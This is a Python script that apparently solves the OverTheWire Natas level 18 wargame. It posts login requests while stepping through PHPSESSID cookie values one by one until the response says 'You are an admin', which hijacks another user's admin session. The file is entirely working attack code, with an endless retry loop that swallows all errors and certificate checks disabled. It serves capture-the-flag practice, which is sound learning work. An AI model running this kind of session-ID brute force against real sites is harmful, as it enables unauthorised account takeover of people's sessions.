import requests
from requests.auth import HTTPBasicAuth

username = 'natas18'

auth = HTTPBasicAuth('natas18', 'wherethepassword')
headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'Cookie' : 'PHPSESSID=0; path=/; HttpOnly'}

actualID=0

url = "http://natas18.natas.labs.overthewire.org/index.php"

while True:
    payload="username=admin&password=verysecretpassword"
    headers['Cookie'] = f"PHPSESSID={actualID}"
    
    while True:
        try:
            response=requests.post(url, data=payload, headers=headers, auth=auth, verify=False)
            break
        except:
            continue
    
    if 'You are an admin' in response.text:
        print(response.text)
        break
    actualID = actualID+1
    print(actualID)